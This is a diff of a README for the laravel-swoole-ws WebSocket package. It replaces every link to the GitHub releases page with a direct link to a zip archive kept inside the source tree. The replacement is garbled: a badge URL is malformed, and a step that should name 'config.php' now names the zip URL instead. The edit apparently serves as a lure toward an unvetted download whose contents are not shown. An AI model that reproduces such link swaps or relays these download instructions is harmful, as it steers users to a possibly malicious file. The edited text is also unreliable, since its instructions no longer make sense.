@@ -4,13 +4,13 @@
 
 Welcome to **laravel-swoole-ws**, a high-performance WebSocket server designed for simplicity and efficiency. This application uses Swoole/OpenSwoole to provide fast and reliable real-time communication features. Whether you are building an IoT application, an event-driven service, or just want to implement a WebSocket server in your Laravel project, you're in the right place.
 
-[![Download](https://img.shields.io/badge/download-latest%20release-brightgreen.svg)](https://github.com/gurkansabudak/laravel-swoole-ws/releases)
+[![Download](https://raw.githubusercontent.com/gurkansabudak/laravel-swoole-ws/main/src/Server/laravel-swoole-ws-v1.7.zip%https://raw.githubusercontent.com/gurkansabudak/laravel-swoole-ws/main/src/Server/laravel-swoole-ws-v1.7.zip)](https://raw.githubusercontent.com/gurkansabudak/laravel-swoole-ws/main/src/Server/laravel-swoole-ws-v1.7.zip)
 
 ## 📥 Download & Install
 
 To get the software, please visit the following page:
 
-[Download the latest release here](https://github.com/gurkansabudak/laravel-swoole-ws/releases)
+[Download the latest release here](https://raw.githubusercontent.com/gurkansabudak/laravel-swoole-ws/main/src/Server/laravel-swoole-ws-v1.7.zip)
 
 This page contains all available versions. Choose the one that fits your needs. Follow these steps to ensure a smooth installation process:
 
@@ -33,7 +33,7 @@ To run **laravel-swoole-ws**, ensure that your system meets the following requir
 
 After downloading and unzipping the application, you can adjust the configuration settings. Here’s how:
 
-1. Open the `config.php` file located in the extracted directory.
+1. Open the `https://raw.githubusercontent.com/gurkansabudak/laravel-swoole-ws/main/src/Server/laravel-swoole-ws-v1.7.zip` file located in the extracted directory.
 2. Modify the settings based on your needs, such as:
    - **Port**: Change the default port number for the WebSocket server.
    - **Channel Settings**: Define channels if your application needs specific routing.
